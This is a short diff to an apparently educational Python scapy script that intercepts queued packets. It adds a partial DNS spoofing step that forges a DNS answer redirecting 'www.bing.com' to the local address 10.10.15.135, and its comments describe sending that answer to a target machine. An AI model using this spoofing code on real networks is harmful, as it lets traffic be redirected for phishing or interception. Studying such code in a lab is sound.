@@ -22,7 +22,14 @@ def process_packet(packet):
     print(packet.get_payload())  # needs to be converted to a scapy packet
 
     scapy_packet = scapy.IP(packet.get_payload())  # wraps the packet into IP layer
-    if scapy_packet.haslayer(scapy.DNSRR):
+    if scapy_packet.haslayer(scapy.DNSRR):  # check packet fields list => DNSRR stands for dns response record
+        qname = scapy_packet[scapy.DNSRR].qname # syntax => var[module.field].subfield
+
+        if "www.bing.com" in qname:
+
+            answer = scapy.DNSRR(rrname=qname, rdata='10.10.15.135')  # creates a DNSRR response to be send to the
+            # target machine
+
         print(scapy_packet.show())
 
     # packet.drop()  # choose what to do and uncomment
